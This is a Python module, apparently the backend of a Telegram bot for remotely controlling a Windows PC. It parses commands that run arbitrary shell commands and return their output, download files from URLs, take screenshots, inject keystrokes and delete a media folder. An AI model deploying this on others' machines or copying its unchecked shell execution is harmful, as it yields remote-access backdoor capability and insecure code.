# -*- coding: utf8 -*-
import subprocess, os, re, time
import wget as wg
import pyautogui,os,time
import keyboard

opa_pc=0

def lock():
	scrnW, scrnH = pyautogui.size() # Get the size of the primary monitor.

	# while 1:
	currentMouseX, currentMouseY = pyautogui.position() # Get the XY position of the mouse.
	print(currentMouseX,currentMouseY)
	time.sleep(0.05)
	keyboard.press_and_release("alt+f4")
	# pyautogui.click(scrnW-20, 20, button='left')  # Move the mouse to XY coordinates and click it.
	pyautogui.click(scrnW//2, int(scrnH*0.52), button='left')

	return "🖥✅"
		# os.system("cls")

	# pyautogui.moveTo(scrnW, 0) # Move the mouse to XY coordinates.

	# pyautogui.click()          # Click the mouse.

def output_keyboard(text):
	keyboard.press_and_release("space")
	for i in text:
		if i == i.lower():
			keyboard.press_and_release(i)
		else:
			keyboard.press_and_release("shift+"+i)
		keyboard.press_and_release("space")
	return "🖥✅"

def screenshot():  
	filename = f"{time.time()}.jpg"
	pyautogui.screenshot(filename)
	return filename

def find_name(fig):
	lop=0
	dir=os.listdir("media/")
	for i in dir:
		if i[:3]==fig:
			lop+=1
	return fig+str(lop)
	
def ren(path, content):
	vb=find_name(content)
	if content=="vid":
		os.rename("media/"+path,"media/"+vb+".mp4")
	elif content=="pic":
		os.rename("media/"+path,"media/"+vb+".png")
	return vb
def video(vid):
	start_file(vid+".mp4")
	keyboard.press_and_release("F11")
	return "🖥✅"

def pict(pic):
	start_file(pic+".png")
	keyboard.press_and_release("F11")
	return "🖥✅"

def cmdo(com):
	try:			res=subprocess.check_output(com, shell=1)
	except:			return '🖥❌'
	try:			res=res.decode('utf8')
	except:
		try:		res=res.decode('cp866')
		except:		return '🖥❌'
	return '🖥✅:\n'+res


def cmdi(com):
	try:
		os.system(com)
		return '🖥✅'
	except:
		return '🖥❌'

def wget(link,save):
	try:   		wg.download(link, "media/"+save);	return '🖥✅'
	except: 	return '🖥❌🗡'

def comm(text):
	comi4=re.findall(r'{([^<>]+)}', text)
	try:		return comi4, True
	except:		return None, False

def del_exit():
	dir=os.listdir("media/")
	for i in dir:
		os.remove("media/"+i)
	return "🖥✅"

def print_gui(text):
	try:		pyautogui.alert(text, "~");	return '🖥✅'
	except:		return '🖥❌'

def input_gui(text):
	try:		answer = pyautogui.prompt(text, "~")
	except:		return '🖥❌'
	return answer

def start_file(text):
	try:
		os.startfile("media\\"+text)
		return "🖥✅"
	except: return "🖥❌"

def com_bot(kl):
	res='❌Нет такой команды❌'#, зато есть такие:\n\nСписок функций и их использование:\n1. Выполнить команду, на её вывод всё-равно:    cmdi: <команда>\n2. Выполнить команду и вернуть её вывод в телеграмм: cmdo: <команда>\n3. Сохранить фото, аудио или видео на ПК:    просто отправить этот файл\n4. Скачать файл из интернета:    wget <ссылка>\n\nКоманты и ссылки обязателно надо писать в <>'
	try:
		inp,i=comm(kl)
		if kl.lower()[:4]=='cmdi' and i:
			res=cmdi(inp[0])

		elif kl.lower()[:4]=='cmdo' and i:
			res=cmdo(inp[0])

		elif kl.lower()[:4]=='wget' and i:
			res=wget(inp[0],inp[1])

		elif kl.lower()[:4]=='pict' and i:
			res=pict(inp[0])

		elif kl.lower()[:4]=='vide' and i:
			res=video(inp[0])

		elif kl.lower()[:4]=='outp' and i:
			res=print_gui(inp[0])

		elif kl.lower()[:4]=='inpt' and i:
			res=input_gui(inp[0])

		elif kl.lower()[:4]=='strt' and i:
			res=start_file(inp[0])

		elif kl.lower()[:4]=='keyb' and i:
			res=output_keyboard(inp[0])

		elif kl.lower()[:4]=='scrn':
			res=screenshot()

		elif kl.lower()[:4]=='lock':
			res=lock()

		elif kl.lower()[:4]=='exit':
			res=del_exit()	

		return res


	except: return res
# print(del_exit("kkd"))
# print(start_file(input()))
